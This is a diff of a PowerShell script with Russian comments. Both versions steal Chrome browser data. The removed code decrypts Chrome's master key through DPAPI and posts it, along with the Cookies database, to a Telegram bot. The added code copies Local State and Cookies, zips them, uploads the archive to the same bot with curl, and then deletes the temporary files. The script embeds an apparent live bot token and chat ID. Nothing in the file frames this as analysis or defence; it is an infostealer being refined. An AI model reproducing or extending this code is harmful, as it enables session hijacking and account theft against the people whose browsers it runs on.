@@ -1,31 +1,34 @@
-Add-Type -AssemblyName System.Security
 $token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
 $chatId = "1940923712"
 
-# 1. Попытка дешифровки через альтернативный контекст
-try {
-    $lsPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-    $cpPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
-    
-    $json = Get-Content $lsPath -Raw | ConvertFrom-Json
-    $encryptedKey = [System.Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..($json.os_crypt.encrypted_key.Length - 1)]
-    
-    # Пытаемся разблокировать ключ через принудительный вызов текущего пользователя
-    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-    $base64Key = [System.Convert]::ToBase64String($masterKey)
-    
-    # Если ключ получен, отправляем его
-    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=✅ SUCCESS! KEY: $base64Key"
-} catch {
-    # Если всё еще ошибка, отправляем СЫРОЙ зашифрованный ключ (мы расшифруем его позже)
-    $rawKey = $json.os_crypt.encrypted_key
-    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=⚠️ DPAPI Locked. Raw Key Sent."
-}
+# Пути к файлам
+$userData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$localState = "$userData\Local State"
+$cookies = "$userData\Default\Network\Cookies"
 
-# 2. В любом случае забираем базу куки (это работает всегда)
-$tempC = "$env:TEMP\c.db"
-if (Test-Path $cpPath) {
-    Copy-Item $cpPath $tempC -Force
-    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$tempC"
-    Remove-Item $tempC
+# Куда копируем
+$destDir = "$env:TEMP\collect"
+New-Item -ItemType Directory -Path $destDir -Force | Out-Null
+
+try {
+    # 1. Забираем Local State (там зашифрованный ключ)
+    Copy-Item $localState -Destination "$destDir\ls.json" -Force
+    
+    # 2. Забираем Cookies (база данных)
+    # Если браузер открыт, обычное копирование может не сработать, используем 'Force'
+    Copy-Item $cookies -Destination "$destDir\c.db" -Force
+
+    # 3. Архивируем и отправляем (используем встроенный в Windows Compress-Archive)
+    $zipFile = "$env:TEMP\data.zip"
+    Compress-Archive -Path "$destDir\*" -DestinationPath $zipFile -Force
+    
+    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zipFile"
+    
+    # Чистим за собой
+    Remove-Item $destDir -Recurse -Force
+    Remove-Item $zipFile -Force
+    
+    Write-Host "Success! Archive sent."
+} catch {
+    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Error collecting files"
 }
